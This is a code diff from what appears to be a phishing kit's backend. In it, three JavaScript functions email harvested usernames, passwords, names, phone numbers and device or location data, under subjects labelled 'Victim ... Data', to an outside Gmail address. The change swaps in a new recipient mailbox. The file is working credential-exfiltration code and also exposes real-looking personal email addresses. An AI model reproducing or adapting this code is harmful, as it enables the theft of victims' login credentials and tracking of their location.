@@ -14,7 +14,7 @@ function mailkaro(dataof,usname, passpw){
     // Email content
     const mailOptions = {
       from: 'anshuman91vish@gmail.com',
-      to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
+      to: 'gunjanlalwani2222@gmail.com', // Replace with the recipient's email address
       subject: `Victim ${dataof} Data`,
       text: `
                     username : ${usname}
@@ -48,7 +48,7 @@ function mail_contact_info(dataof,fullname,usname, passpw, phone){
   // Email content
   const mailOptions = {
     from: 'anshuman91vish@gmail.com',
-    to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
+    to: 'gunjanlalwani2222@gmail.com', // Replace with the recipient's email address
     subject: `Victim ${dataof} Data`,
     text: `
                   Name     : ${fullname}
@@ -83,8 +83,8 @@ function senddeviceinfo(deviceinfo){
     // Email content
     const mailOptions = {
       from: 'anshuman91vish@gmail.com',
-      to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
-      subject: `Victim Device Data`,
+      to: 'gunjanlalwani2222@gmail.com', // Replace with the recipient's email address
+      subject: `Victim Location Data`,
       text: `${deviceinfo}`,
     };
     
